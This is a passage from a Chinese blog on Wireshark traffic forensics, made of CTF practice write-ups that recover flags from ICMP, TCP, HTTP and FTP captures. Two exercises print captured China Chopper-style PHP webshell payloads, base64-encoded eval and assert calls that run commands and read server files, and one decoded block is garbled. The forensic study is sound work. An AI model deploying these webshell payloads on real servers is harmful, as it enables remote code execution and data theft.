src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306210347267.png" alt="image-20250306210347267"></p><h3 id="导出对象"><a class="markdownIt-Anchor" href="#导出对象"></a> 导出对象</h3><ul><li>使用<code>wireshark</code>这个导出对象的功能会更方便导出一些流量中的网页等。不会像追踪流保持数据保存时会把头数据给保存了。</li><li>功能面板如下的位置如下图所示：</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306231709382.png" alt="image-20250306231709382"></p><ul><li>这边我们就来导出一个<code>HTTP</code>协议的数据包内容，查看文件内容发现这个<code>.php</code>文件中的内容是一个<code>base64</code>编码，解码后是一张图片。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306231747660.png" alt="image-20250306231747660"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306231803204.png" alt="image-20250306231803204"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250306232341960.png" alt="image-20250306232341960"></p><h3 id="提取流量包"><a class="markdownIt-Anchor" href="#提取流量包"></a> 提取流量包</h3><ul><li>有的时候一个流量文件中有非常多的流量包，这时我们需要对这个流量文件进行分组，可以按照协议分组也可以按照<code>ip</code>分组，这时我们就可以分组，然后将这些组导出成一个新的流量包，这时我们在这个流量包中就会更方便分析特定的流量包。更有利于分析。</li></ul><h1 id="练习"><a class="markdownIt-Anchor" href="#练习"></a> 练习</h1><h2 id="题目1_扫描流量检测"><a class="markdownIt-Anchor" href="#题目1_扫描流量检测"></a> 题目1_扫描流量检测</h2><ul><li>题目描述：</li></ul><blockquote><p>入侵者通过<code>ping</code>工具对局域网内一主机进行存活性扫描,flag 为入侵所发送的<code>16</code>字节的数据包内容。</p></blockquote><ul><li>这里我们要知道<code>ping</code>工具使用的流量包协议为<code>ICMP</code>协议，所以我们打开流量包，只需要过滤出<code>ICMP</code>协议即可。、</li><li>这时就会看到<code>5</code>个<code>ICMP</code>流量包</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307171258574.png" alt="image-20250307171258574"></p><ul><li>这时我们查看包中具体发送的内容，看到<code>Data</code>这个字段，就得到发送的数据</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307171417345.png" alt="image-20250307171417345"></p><ul><li>所以我们就提取出十六进制数转为字符串即可得到flag</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2122232425262728292</span>a2b2c2d2e2f30</span><br><span class="line">flag&#123;!<span class="string">&quot;#$%&amp;&#x27;()*+,-./0&#125;</span></span><br></pre></td></tr></table></figure><h2 id="题目2_关键字符提取"><a class="markdownIt-Anchor" href="#题目2_关键字符提取"></a> 题目2_关键字符提取</h2><ul><li>题目描述：</li></ul><blockquote><p>请找到流量包中的<code>flag</code>,格式为:<code>nctf&#123;&#125;</code></p></blockquote><ul><li>先打开流量包，然后直接搜索<code>nctf</code>即可得到对应<code>flag</code></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307185018994.png" alt="image-20250307185018994"></p><ul><li><strong>flag</strong>为：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;wireshark_is_easy&#125;</span><br></pre></td></tr></table></figure><h2 id="题目3_特殊字符提取"><a class="markdownIt-Anchor" href="#题目3_特殊字符提取"></a> 题目3_特殊字符提取</h2><ul><li>题目描述：</li></ul><blockquote><p>请找到密码,组合为<code>flag</code>,格式为:<code>flag&#123;密码&#125;</code></p></blockquote><ul><li>打开流量包，先查看包的统计情况：发现全是<code>tcp</code>流</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307185355314.png" alt="image-20250307185355314"></p><ul><li>这里我们就使用追踪流的功能：发现只有流<code>0</code>，这时我们可以看到流<code>0</code>中有如<code>password</code>，那是否<code>password</code>的值就是<code>backdoor...00Rm8.ate</code>呢？</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307185623121.png" alt="image-20250307185623121"></p><ul><li><code>password</code>的值其实并不是<code>backdoor...00Rm8.ate</code>，在<code>wireshark</code>中<code>...</code>可能表示不可显字符串，所以一但字符中出现这个，我们就需要先使用<code>十六进制的形式</code>去查看，然后找到对应的<code>ASCII</code>码。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307185909412.png" alt="image-20250307185909412"></p><ul><li>这时我们看到<code>.</code>实际的十六进制为<code>7f</code>，这时我们就对这<code>ASCII码</code>值发现是<code>DEL</code>字符，表示删除键，所以<code>backdoor...00Rm8.ate</code>这边会被删除掉几个字符，<code>0d</code>就表示回车字符</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307190033776.png" alt="image-20250307190033776"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307191552889.png" alt="image-20250307191552889"></p><ul><li>所以<code>密码</code>为：<code>backdoorm8te</code>：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;backdoorm8te&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：我们<code>Del</code>键是删除后面的字符串，就像这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">abcdefgh</span><br><span class="line">我们使用|代表光标</span><br><span class="line">abcde|fgh</span><br><span class="line">当我们按下一次del键后就会变成</span><br><span class="line">abcde|gh</span><br><span class="line">其实字符流就是</span><br><span class="line"><span class="number">0x61</span> <span class="number">0x62</span> <span class="number">0x63</span> <span class="number">0x64</span> <span class="number">0x65</span> <span class="number">0x7f</span> <span class="number">0x66</span> <span class="number">0x67</span> <span class="number">0x68</span></span><br></pre></td></tr></table></figure><h2 id="题目4_提取压缩包"><a class="markdownIt-Anchor" href="#题目4_提取压缩包"></a> 题目4_提取压缩包</h2><ul><li>题目描述：</li></ul><blockquote><p><code>key</code>为文本格式，你找得到吗？</p></blockquote><ul><li>打开流量包，先查看流量统计，发现只存在<code>TCP</code>协议，但是没有<code>HTTP</code>协议</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307192250792.png" alt="image-20250307192250792"></p><ul><li>这时我们就直接追踪流。发现这个流量包中一共有<code>3</code>个流，我们在流<code>1</code>中发现了<code>key: ZipYourMouth</code>，这个很可能是压缩包的密码</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307192408365.png" alt="image-20250307192408365"></p><ul><li>接下来我们再查看其他流，我们在流<code>0</code>中看到了这个<code>PK</code>然后一堆乱码，这时我们就会想到<code>zip</code>压缩包的文件头就是<code>PK</code>开头，所以这就相当于一个<code>zip</code>包，并且还有一个<code>flag.txt</code>的文件</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307200558929.png" alt="image-20250307200558929"></p><ul><li>之后我们就将这个<code>zip</code>包进行保存，注意<strong>这里是纯TCP流</strong>，并没有应用层的协议，所以使用不了<strong>导出对象</strong>，只能在追踪流那边点击保存，这时我们就选择<code>单向发包</code>的这个，还有一点就是要将这个流显示为原始数据，这样将这个另存为<code>xx.zip</code>的时候，才会存储原始数据</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307200524346.png" alt="image-20250307200524346"></p><ul><li>这时我们尝试使用<code>360zip</code>把这个压缩包打开。发现文件没有出错，并且要求输入密码，</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307200704076.png" alt="image-20250307200704076"></p><ul><li>这时我们就直接输入密码再解压缩就可以得到对应的flag了</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag-qscet5234diQ</span><br></pre></td></tr></table></figure><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307200747817.png" alt="image-20250307200747817"></p><h2 id="题目5_文件提取1"><a class="markdownIt-Anchor" href="#题目5_文件提取1"></a> 题目5_文件提取1</h2><ul><li><p>题目描述：无</p></li><li><p>打开这个流量包，发现就<code>4</code>个流，从流<code>0</code>到流<code>3</code>，我们逐个追踪流，发现流<code>1</code>这边执行了类似<code>ls</code>的命令，说明可以远程执行命令，这时已经拿到<code>shell</code>了。</p></li><li><p>然后我我们看看流<code>0</code>，就会发现用户发给服务器的数据中，可能含有<code>webshell</code></p></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307201221197.png" alt="image-20250307201221197"></p><ul><li>我们还注意到这个程序访问了<code>isg.php</code>，我们看看能不能把这个文件使用<code>导出对象</code>提取出来，发现可以，提取内容如下，与上图的发送数据一致</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202416320.png" alt="image-20250307202416320"></p><ul><li>这时我们就要来分析这个<code>webshell</code>具体执行的是什么，我们将这个<code>webshell</code>使用<code>URL</code>解码可以得到这样：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISG2014=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure><ul><li>整理可以得到，相当于命令执行</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(base64_decode($_POST[z0]));&amp;</span><br><span class="line">z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw==</span><br></pre></td></tr></table></figure><ul><li>而<code>z0</code>经过<code>base64</code>解码之后就会出现如下，这个估计就相当于<code>webshell</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;,&quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">@set_magic_quotes_runtime(0);</span><br><span class="line">echo(&quot;-NÎÉY\[YJÔÑTTÈÐÔTÑSSSQHJNÚYOHIY\[YJÔÑTTÈUÕSÓUQJNÉHÉWÚYÝXÝJHOHÈ^ÙÜXXÚ</span><br><span class="line">[ÙJHH\È</span><br><span class="line">ZY\×Ù\ÉNJIHÉNßIHÉOJ[Ý[ÛÙ^\ÝÊÜÜÚ^ÙÙ]YÚYÊJOÐÜÚ^ÙÙ]ÝZY</span><br><span class="line">ÜÚ^ÙÙ]]ZY</span><br><span class="line"></span><br><span class="line">JNÉÎÉ\ÜJJOÉVÉÛ[YI×NÙ]ØÝ\[Ý\Ù\</span><br><span class="line">NÉ\Ý[[YJ</span><br><span class="line">NÉHÉ\ÜJHÜ[ÎÙXÚÊHNÙYJ</span><br><span class="line">NÄ</span><br></pre></td></tr></table></figure><ul><li>然后继续翻找流<code>2</code>，发现是命令执行</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202524428.png" alt="image-20250307202524428"></p><ul><li>之后我们看流<code>3</code>，这时我们发现了一个压缩包</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202630510.png" alt="image-20250307202630510"></p><ul><li>这时我们不能使用导出对象了，我们还是按照题目4中提取压缩包的方法来。提取的是服务器发送给客户机的。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202730295.png" alt="image-20250307202730295"></p><ul><li>下载下来后可以正常解压缩，这样我们解压缩后就会找到<code>flag</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ISG&#123;China_Ch0pper_Is_A_Slick_Little_Webshe11&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307202859303.png" alt="image-20250307202859303"></p><h2 id="题目6_文件提取2"><a class="markdownIt-Anchor" href="#题目6_文件提取2"></a> 题目6_文件提取2</h2><ul><li><p>题目描述：无</p></li><li><p>打卡流量包后，注意到流量包有点多，就先查看一下流量统计，发现有<code>FTP</code>文件，这时就会想到流量中可能可以导出文件。</p></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203124294.png" alt="image-20250307203124294"></p><ul><li>这时我们直接导出对象，发现可以导出<code>hehehe.rar</code>，导出后的压缩包可以正常打开，但是需要密码才能解压</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203319977.png" alt="image-20250307203319977"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203304340.png" alt="image-20250307203304340"></p><ul><li>这时我们就继续去寻找一下流量包中是否有密码，这时我们在流<code>5</code>中找到了这个密码<code>0rvWprrs0NOz9se9wLQ=</code>，现在先来尝试<code>base64</code>解码，发现是乱码</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203529876.png" alt="image-20250307203529876"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/Snipaste_2025-03-07_20-36-20.png" alt="Snipaste_2025-03-07_20-36-20"></p><ul><li>在翻找的过程中我们还发现了流<code>4</code>中有发送一个<code>png</code>图片，经典png头，导出的png图片没啥作用</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307203727917.png" alt="image-20250307203727917"></p><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307204308046.png" alt="image-20250307204308046"></p><ul><li>接下来我们猜想前面的<code>base64</code>是<code>gpk</code>编码的<code>base64</code>，发现确实是<code>gbk</code>编码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&#x27;0rvWprrs0NOz9se9wLQ=&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(a).decode(<span class="string">&#x27;gbk&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一枝红杏出墙来</span></span><br></pre></td></tr></table></figure><ul><li>看wp发现密码能解的开，但是我这边密码解不开QAQ，这里就直接贴<code>wp</code>了，解压之后就是修复<code>png</code>文件头，这样就可以打开图片得到flag了</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307205718514.png" alt="image-20250307205718514"></p><h2 id="题目7_导出对象1"><a class="markdownIt-Anchor" href="#题目7_导出对象1"></a> 题目7_导出对象1</h2><ul><li><p>题目名称：流量中的线索.pcapng</p></li><li><p>题目描述：无</p></li><li><p>打开流量包，就先查看统计分析的包，发现<code>http</code>协议数据最多</p></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307205851278.png" alt="image-20250307205851278"></p><ul><li>这时我们就追踪一下流，发现有访问一个文件<code>fenxi.php</code></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210012289.png" alt="image-20250307210012289"></p><ul><li>然后就直接看看能不能提取对象：</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210040093.png" alt="image-20250307210040093"></p><ul><li>发现可以，就将<code>fenxi.php</code>文件提取出来，打开发现是非常大一串的编码，猜测是图片进行了<code>base64</code>编码</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210119640.png" alt="image-20250307210119640"></p><ul><li>这时我们就<code>base64</code>解码成图片看看，发现确实是这样的，并且flag在图片中。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210255036.png" alt="image-20250307210255036"></p><h2 id="题目8_导出对象2"><a class="markdownIt-Anchor" href="#题目8_导出对象2"></a> 题目8_导出对象2*</h2><ul><li><p>题目名称：Misc-我抓到你了</p></li><li><p>题目描述：无</p></li><li><p>打开包，继续查看统计，发现还是<code>http</code>协议这边字节占比最大</p></li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210620670.png" alt="image-20250307210620670"></p><ul><li>这里就直接追踪http流，发现流<code>0</code>中，用户就发送了一个数据给服务器，并且访问的是<code>1.php</code>这个文件，这个应该是一个<code>webshell</code>文件。</li></ul><p><img src="/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20250307210716496.png" alt="image-20250307210716496"></p><ul><li>我们分析发送的这一串数据，不知道怎么去除，不知道这个是什么，没怎么学web，应该是<code>PHP的RCE</code>这边</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a=array_map(&quot;ass&quot;.&quot;ert&quot;,array(&quot;ev&quot;.&quot;Al(\&quot;\\\$xx%3D\\\&quot;Ba&quot;.&quot;SE6&quot;.&quot;4_dEc&quot;.&quot;OdE\\\&quot;;@ev&quot;.&quot;al(\\\$xx(&#x27;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7JEY9Ii92YXIvd3d3L2ZsYWcuemlwIjskZnA9QGZvcGVuKCRGLCdyJyk7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oJ0VSUk9SOi8vIENhbiBOb3QgUmVhZCcpO307ZWNobygiWEBZIik7ZGllKCk7&#x27;));\&quot;);&quot;));</span><br><span class="line"></span><br><span class="line">//分析得到的结果如下：</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="题目9_导出对象3"><a class="markdownIt-Anchor" href="#题目9_导出对象3"></a> 题目9_导出对象3*</h2><ul><li>题目名：fly.pcapng</li><li>题目描述：无</li></ul>]]></content>
    
    
    <summary type="html">前言：学习流量分析，准备比赛</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-rabbit</title>
    <link href="http://iyheart.github.io/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/"/>
    <id>http://iyheart.github.io/2025/03/03/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-rabbit/</id>
    <published>2025-03-03T14:46:21.000Z</published>
